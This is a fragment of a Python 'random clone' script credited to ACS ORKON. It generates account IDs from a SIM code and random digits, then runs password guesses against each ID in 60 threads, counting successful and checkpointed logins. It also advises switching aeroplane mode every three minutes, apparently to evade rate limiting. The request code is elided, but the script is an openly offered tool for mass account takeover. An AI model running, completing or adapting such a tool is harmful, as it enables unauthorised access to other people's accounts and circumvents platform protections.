...
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come to, MAHIR , tools"')
def logo():
...
{40*"="} \x1b[1;97m
 ...
 [{R}+{W}] AUTHOR   : ACS ORKON
 [{R}+{W}] GITHUB  :  markdevon404
 [{R}+{W}] FACEBOOK : Nihal Rahman Orkon x Anonymous Cyber Sheild 
              Try ✅
...
def rmenu1():
	...
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f' [{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f' {W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {W}[{G}•{W}] \033[1;37mTHE PROCESS ACS RANDOM CLONE STARTED');print(f' [{G}•{W}] \033[1;37mUSE AEROPLANE MODE IN EVERY 3 MIN ');print(40*"=")
		for rngx in xode:
			id=code+rngx
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}M-ICD{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
